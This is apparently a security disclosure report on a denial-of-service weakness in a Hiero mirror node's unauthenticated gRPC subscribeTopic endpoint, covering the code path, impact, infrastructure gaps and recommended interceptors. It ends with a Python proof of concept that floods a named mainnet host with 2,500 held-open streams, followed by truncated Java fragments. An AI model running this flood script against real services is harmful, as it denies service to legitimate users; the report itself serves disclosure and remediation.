### Title
Unbounded Multi-Connection gRPC Stream Exhaustion via Unauthenticated `subscribeTopic` Endpoint

### Summary
`ConsensusController.subscribeTopic()` accepts unlimited concurrent gRPC streaming subscriptions from any unauthenticated client. The only server-side concurrency guard, `maxConcurrentCallsPerConnection=5`, is scoped per TCP/HTTP-2 connection, not per IP or globally. An attacker who opens many connections can multiply that limit arbitrarily, exhausting the thread pool, database connection pool, and Redis listener capacity, denying service to legitimate subscribers.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` at [1](#0-0)  accepts any `ConsensusTopicQuery` with no authentication check, no per-caller connection count check, and no rate gate before calling `topicMessageService::subscribeTopic`. Each accepted call creates a live Reactor subscription backed by a Redis listener and a DB polling retriever.

The only concurrency control configured on the Netty server is: [2](#0-1) 

which reads the default value: [3](#0-2) 

`maxConcurrentCallsPerConnection` is a Netty/gRPC per-HTTP-2-connection limit. It does **not** limit the number of connections an IP may open, nor the total number of concurrent streams across all connections.

**No application-layer interceptor exists** for the gRPC module. The `grpc/src/main/java/org/hiero/mirror/grpc/` source tree contains no `interceptor/` package; the only interceptor found is a test-only stub. [4](#0-3) 

`TopicMessageServiceImpl` tracks subscriber count as a Micrometer gauge but enforces no ceiling: [5](#0-4) 

**Root cause:** The design assumes one connection per legitimate client and treats `maxConcurrentCallsPerConnection` as a global guard. That assumption fails because HTTP/2 multiplexing allows a single process to open an arbitrary number of TCP connections, each carrying 5 streams.

### Impact Explanation

Each accepted `subscribeTopic` stream:
- Holds a Reactor subscription on the shared Redis/poll listener
- Consumes a thread from the bounded `applicationTaskExecutor` pool for reactive scheduling
- May issue periodic DB queries through the HikariCP connection pool (monitored by `GrpcHighDBConnections` alert at 75% utilization)

An attacker opening *C* connections saturates the server with *C × 5* concurrent streams. At a modest 200 connections the server carries 1,000 open streams. This exhausts the executor thread pool and DB connection pool, causing `RESOURCE_EXHAUSTED` or silent hangs for all subsequent legitimate subscribers. The `GrpcNoSubscribers` alert fires only after 5 minutes of zero legitimate subscribers — well after the partition is established.

### Likelihood Explanation

**Preconditions:** None. The endpoint is unauthenticated and publicly reachable on port 5600. No API key, token, or TLS client certificate is required.

**Feasibility:** A single commodity machine can sustain thousands of HTTP/2 connections using standard gRPC client libraries (e.g., `grpc-java`, `grpcurl`, Python `grpcio`). The attacker does not need to send traffic at high rate — streams are opened slowly (below any rate threshold) and held open by subscribing to an active topic with no `consensusEndTime`, keeping them alive indefinitely.

**Infrastructure mitigations are insufficient:**
- `maxRatePerEndpoint: 250` in the GCP backend policy [6](#0-5)  limits new stream initiations per second per pod, not the number of *concurrently open* streams. An attacker opening 1 stream/second reaches 250 open streams in under 5 minutes without triggering this limit.
- `sessionAffinity: CLIENT_IP` [7](#0-6)  concentrates all attacker traffic on a single pod, making exhaustion of that pod faster.
- The Traefik middleware only configures a circuit breaker and retry; no per-IP connection limit. [8](#0-7) 
- The GCP gateway is disabled by default (`global.gateway.enabled: false`). [9](#0-8) 

### Recommendation

1. **Add a `ServerInterceptor`** in `grpc/src/main/java/org/hiero/mirror/grpc/interceptor/` that tracks concurrent open streams per remote IP using a `ConcurrentHashMap<String, AtomicInteger>`. Reject new calls with `Status.RESOURCE_EXHAUSTED` when the per-IP count exceeds a configurable threshold (e.g., 10).
2. **Add a global concurrent-stream ceiling** in `TopicMessageServiceImpl.subscribeTopic()` by comparing `subscriberCount` against a configurable `maxSubscribers` property and returning `Mono.error(Status.RESOURCE_EXHAUSTED)` when exceeded.
3. **Configure `maxConnectionsPerIp`** (or equivalent) at the load-balancer/ingress layer for all deployment paths, not only the optional GCP gateway.
4. **Enable the GCP gateway by default** or document that the Traefik path requires equivalent per-IP connection limiting middleware.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror.mainnet.hedera.com:443"
CONNECTIONS = 500   # open 500 independent HTTP/2 connections
STREAMS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1234),
        # no consensusEndTime → stream stays open indefinitely
    )
    streams = []
    for _ in range(STREAMS_PER_CONN):
        it = stub.subscribeTopic(query)
        streams.append(it)
    # hold streams open
    import time; time.sleep(3600)

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: 2500 concurrent open streams on the server;
# legitimate clients receive RESOURCE_EXHAUSTED or hang indefinitely.
```

public class GrpcInterceptor implements ServerInterceptor {

        final var fullMethod = call.getMethodDescriptor().getFullMethodName();
